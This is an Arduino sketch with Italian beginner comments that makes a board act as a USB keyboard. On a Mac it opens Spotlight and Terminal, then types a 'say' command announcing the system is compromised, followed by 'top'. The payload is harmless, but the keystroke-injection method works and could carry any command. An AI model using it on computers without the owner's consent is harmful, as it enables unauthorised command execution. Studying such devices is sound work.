#include <Keyboard.h> // La libreria magica che trasforma la scheda in tastiera

void setup() {
  // Inizia l'emulazione della tastiera
  Keyboard.begin();
  
  // REGOLA D'ORO: Aspetta 4 secondi prima di fare qualsiasi cosa!
  // Serve a darti il tempo di staccare il cavo se qualcosa va storto, 
  // e dà tempo al Mac di riconoscere la nuova "tastiera".
  delay(4000);

  // 1. Premiamo Command + Spazio per aprire Spotlight (la barra di ricerca del Mac)
  // KEY_LEFT_GUI corrisponde al tasto Command del Mac (o tasto Windows su PC)
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  delay(100);
  Keyboard.releaseAll(); // Rilascia i tasti, come se sollevassi le mani
  
  delay(800); // Aspettiamo che la barra di Spotlight compaia sullo schermo

  // 2. Scriviamo "terminal" nella ricerca
  Keyboard.print("terminal");
  delay(500);
  
  // 3. Premiamo Invio per aprire il Terminale del Mac
  Keyboard.write(KEY_RETURN);
  
  delay(2000); // Aspettiamo 2 secondi pieni che il Terminale si carichi sullo schermo

  // 4. Scriviamo il comando per far parlare il Mac!
  // Il comando "say" del Mac legge ad alta voce il testo successivo.
  // Usiamo solo lettere semplici perché la scheda digita con il layout USA di base.
  Keyboard.print("say sistema compromesso da samuele");
  delay(200);
  
  // 5. Premiamo Invio per eseguire il comando nel terminale
  Keyboard.write(KEY_RETURN);
  Keyboard.print("top");
  Keyboard.write(KEY_RETURN);
  
  // Chiudiamo la comunicazione della tastiera per sicurezza
  Keyboard.end();
}

void loop() {
  // Lasciamo vuoto: vogliamo che l'attacco avvenga UNA SOLA VOLTA all'inserimento
}